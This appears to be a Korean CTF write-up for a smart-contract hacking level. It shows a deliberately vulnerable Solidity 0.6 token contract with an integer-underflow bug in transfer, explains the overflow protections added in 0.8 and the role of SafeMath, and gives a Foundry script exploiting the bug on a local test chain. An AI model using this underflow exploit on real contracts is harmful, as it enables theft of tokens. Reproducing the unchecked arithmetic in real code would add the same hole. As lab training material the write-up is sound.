# 지문

이 레벨의 목표는 아래의 **기본 토큰 컨트랙트**를 해킹하는 것입니다.

처음에 **20개의 토큰**이 주어지며, 어떤 식으로든 **추가 토큰을 확보**하면 이 레벨을 클리어할 수 있습니다.
가능하다면 **아주 많은 양의 토큰**을 확보하는 것이 좋습니다.

도움이 될 수 있는 것들:

* 주행 거리계(odometer)가 무엇인지 생각해보기.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

# 풀이 
solidity 0.6.0 버전대임을 주목할 필요가 있음.
solidity 0.8.0 버전대부터는 개발자가 신경쓰지않아도 compiler level에서 overflow/underflow guard를 자동으로 적용해줌.

그러나 그 미만 버전에서는 그러한 guard를 자동으로 적용해주지않기 때문에 그러한 guard를 구현한 라이브러리인 `SafeMath`같은것들을 썼는지 꼭 점검해야함.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}
contract SolveScript is Script {
    address public target = 0xCe85503De9399D4dECa3c0b2bb3e9e7CFCBf9C6B;

    function setUp() public {}

    // 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("current user balance : %d", ITarget(target).balanceOf(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC));

        ITarget(target).transfer(address(1), 255);
        console.log("current user balance after poc: %d", ITarget(target).balanceOf(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC));
        vm.stopBroadcast();
    }
}
```